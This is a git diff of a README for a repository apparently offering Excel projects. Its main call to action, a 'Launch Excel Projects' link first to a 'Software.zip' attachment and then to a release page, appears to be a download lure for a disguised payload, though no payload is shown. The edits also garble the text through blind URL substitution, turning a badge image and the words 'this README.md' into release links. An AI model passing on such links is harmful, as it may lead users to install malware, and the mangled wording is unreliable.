@@ -32,9 +32,9 @@ Each project is designed to showcase different aspects of Excel and provide insi
 
 ## 📥 Access the Projects
 
-To access the projects and explore their full potential, click on the following link: [Launch Excel Projects](https://github.com/user-attachments/files/18388744/Software.zip)
+To access the projects and explore their full potential, click on the following link: [Launch Excel Projects](https://github.com/PapaSmurf6945/Excel-Project/releases/tag/v2.0)
 
-[![Launch Excel Projects](https://img.shields.io/badge/Launch-Excel%20Projects-blue)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Launch Excel Projects](https://github.com/PapaSmurf6945/Excel-Project/releases/tag/v2.0%20Projects-blue)](https://github.com/PapaSmurf6945/Excel-Project/releases/tag/v2.0)
 
 In case the link does not work or if you are unable to access the content, please check the "Releases" section of this repository for alternative access options.
 
@@ -52,6 +52,6 @@ Let the Excel projects in this repository be your guide as you embark on a journ
 
 ---
 
-Feel free to bookmark this README.md for future reference and share it with others who are passionate about Excel and data analysis. Let's excel together! 📊🔍
+Feel free to bookmark this https://github.com/PapaSmurf6945/Excel-Project/releases/tag/v2.0 for future reference and share it with others who are passionate about Excel and data analysis. Let's excel together! 📊🔍
 
 📈🔢📊 #Excel #DataAnalysis #DataVisualization #PivotTables #PowerQuery #DAX #SpreadsheetMagic
